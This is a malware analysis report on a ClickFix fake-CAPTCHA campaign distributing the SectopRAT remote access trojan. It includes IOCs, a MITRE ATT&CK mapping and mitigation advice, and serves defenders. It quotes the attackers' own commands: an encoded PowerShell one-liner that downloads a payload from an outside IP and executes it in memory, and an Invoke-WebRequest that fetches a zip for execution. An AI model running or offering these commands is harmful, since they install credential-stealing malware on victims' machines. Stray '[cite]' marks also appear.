# 🔍 Threat Analysis Report: ClickFix Technique (RAT Distribution) - SectopRAT

**Author:** Hernan Diaz Veas
**Incident/Analysis Date:** June 2025 / Updated: September 2026
**Category:** Malware Analysis / Threat Intelligence

---

## 📝 Executive Summary
This report details the infection chain of a distribution campaign for SectopRAT (also known as ArechClient2), a .NET-based remote access trojan (RAT) capable of remote administration, credential theft, screen capture, and data exfiltration. The initial attack leverages the **ClickFix** social engineering technique using fake CAPTCHA validations. Recently, on September 24, 2026, a variant of this malware was reported to be masked within a tampered installation of legitimate software, utilizing a multi-stage loading process to execute its payload in memory. These campaigns aim for financial fraud, unauthorized account activity, exposure of sensitive information, and can lead to operational disruption and financial losses.

## 🔬 Technical Analysis

### 1. Initial Infection Vector
The compromise chain begins with an email containing a legitimate URL. However, the underlying website has been compromised. Upon accessing the URL, traffic is redirected to attacker-controlled infrastructure:
* **Redirection URL:** `hxxp://cta[.]berlmember[.]com/google/captcha[.]html`

This page presents a fake CAPTCHA challenge ("Robot or human?"). The on-screen instructions use pure social engineering to guide the user to:
1. Press `Windows + R` (open the Run dialog).
2. Press `CTRL + V` (paste the malicious content loaded into the clipboard by the webpage).
3. Press `Enter` (execute).

### 2. Execution Chain
By performing the actions indicated by the fake CAPTCHA, the user executes the following obfuscated PowerShell command:

`powershell -win 1 -ep bypass noni -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMQA2AC4AMgAzADgALgA5ADAALgAxADQANQAvAHcALwBrAG8AYQAnACkAIAB8ACAASQBFAFgA`

This script contacts an external IP, downloads the secondary payload directly into memory, and executes it using `IEX` (Invoke-Expression). In addition to this initial chain, recent findings reveal that the malware also utilizes the Windows Command Shell (`cmd.exe`) to execute commands that facilitate malware cleanup and self-removal activities following the receipt of an "Uninstall" command.

**Payload Decoding:**
The `-enc` parameter indicates Base64 encoding. Decoding the string reveals the script's true behavior:

`(New-Object Net.WebClient).DownloadString('http://216[.]238[.]90[.]145/w/koa') | IEX`

This script contacts an external IP, downloads the secondary payload (`koa`) directly into memory, and executes it using `IEX` (Invoke-Expression). Being a fileless technique, it drastically hinders detection by traditional disk-signature-based antivirus engines.

**Downloading Additional Components:**
The execution continues by making an HTTP request to obtain a compressed file:

`Invoke-WebRequest -Uri "https://connect-to-cdn.info/safety/room" -OutFile "$env:TEMP\Lambda.zip"`

Once hosted in the temporary directory, the script decompresses the file and executes the final malicious application: `AppCheckS.exe`.

### 3. Stealth and Memory Loading
The threat employs sophisticated techniques to evade analysis and detection, including API hashing, indirect function calls, encrypted configuration data, and code obfuscation.
* **Concealed Files:** Encrypted shellcode and payload components are concealed within database files named `Activation.Desktop.db` and `pool.db`.
* **Deobfuscation:** The file `sdkcra.dll` decrypts the shellcode stored in `Activation.Desktop.db`, which subsequently decrypts and loads the SectopRAT payload masked within `pool.db` prior to execution.
* **Trace Removal:** The executable deletes itself after receiving the "Uninstall" command to remove traces of the malware from the compromised system.

### 4. Data Collection and Command & Control (C2)
* **Credential Access and Collection:** SectopRAT harvests browser-stored credentials, cookies, autofill data, saved payment card information, and cryptocurrency wallet data from supported browsers and wallet extensions. It also collects sensitive information from email clients and gaming platforms, and captures screenshots of victim activity through command-and-control (C2) instructions.
* **Encrypted Channels:** The malware uses AES-encrypted communications between compromised systems and the hardcoded C2 server `98[.]142[.]252[.]140[:]15847` to exchange commands and victim data.
* **Fallback Protocols:** It attempts to recover alternative C2 information through predefined backup domains when the primary C2 server is unavailable[cite: 8]. Additionally, it uses HTTP POST requests to obtain alternative C2 infrastructure and download additional modules such as `WbElevation.dll`.

---

## 🎯 MITRE ATT&CK Mapping
The threat has been profiled using the MITRE ATT&CK framework to identify Tactics, Techniques, and Procedures (TTPs):

| Tactic | Technique / Procedure | ID |
| :--- | :--- | :--- |
| **Execution** | Command and Scripting Interpreter: PowerShell / Windows Command Shell | T1059.001 / T1059.003 |
| **Defense Evasion** | Obfuscated Files or Information<br>Deobfuscate/Decode Files or Information<br>Indicator Removal: File Deletion | T1027<br>T1140<br>T1070.004 |
| **Credential Access** | Credentials from Password Stores: Credentials from Web Browsers | T1555.003 |
| **Collection** | Screen Capture<br>Data from Local System | T1113<br>T1005 |
| **Command and Control** | Encrypted Channel<br>Application Layer Protocol: Web Protocols<br>Fallback Channels | T1573<br>T1071.001<br>T1008 |

---

## 📌 Indicators of Compromise (IOCs)

**IP Addresses and Ports (Defanged):**
* `216[.]238[.]90[.]145` (Initial ClickFix Server)
* `98[.]142[.]252[.]140[:]15847` (SectopRAT C2 Server)

**Related Files:**
* `koa` / `Lambda.zip` / `AppCheckS.exe` (ClickFix Components)
* `Activation.Desktop.db` (Encrypted shellcode container)
* `pool.db` (Concealed SectopRAT payload)
* `sdkcra.dll` (Decryption module)
* `WbElevation.dll` (Additional module downloaded via C2)
* `ReportDump.exe`
* `FrameworkBase.dll` (Modified component)

**Reference Reports (JoeSandbox):**
* [ClickFix Analysis (1625946)](https://www.joesandbox.com/analysis/1625946)
* ['koa' payload Analysis (1617784)](https://www.joesandbox.com/analysis/1617784)

---

## 🛡️ Detection and Mitigation
Adhering to the following essential cybersecurity best practices is recommended to avoid potential threats:

* **Security Operations Center (SOC):** Monitor for connections to the SectopRAT C2 infrastructure and identified backup domains. Alert on suspicious encrypted HTTP communications and unexpected module downloads.
* **Endpoint Security / EDR Teams:** Investigate the execution of "ReportDump.exe", "sdkcra.dll", and modified "FrameworkBase.dll" components. Review systems for unauthorized scheduled tasks and execution from non-standard directories.
* **Threat Hunting / Incident Response:** Hunt for SectopRAT artifacts, including "sdkcra.dll", "Activation.Desktop.db", and "pool.db". Investigate signs of browser credential theft, cookie extraction, and cryptocurrency wallet data access.
* **Identity & Access Management (IAM):** Reset credentials stored in browsers on affected systems[cite: 9]. Review potentially impacted accounts for suspicious authentication activity.

---

** 📚 Sources and Additional References**
1. Zhang X., "Uncovering a SectopRAT Variant Embedded in Legitimate Software," Fortinet, September 24, 2026. Available: [Fortinet Threat Research](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
2. [ClickFix Analysis (JoeSandbox 1625946)](https://www.joesandbox.com/analysis/1625946)
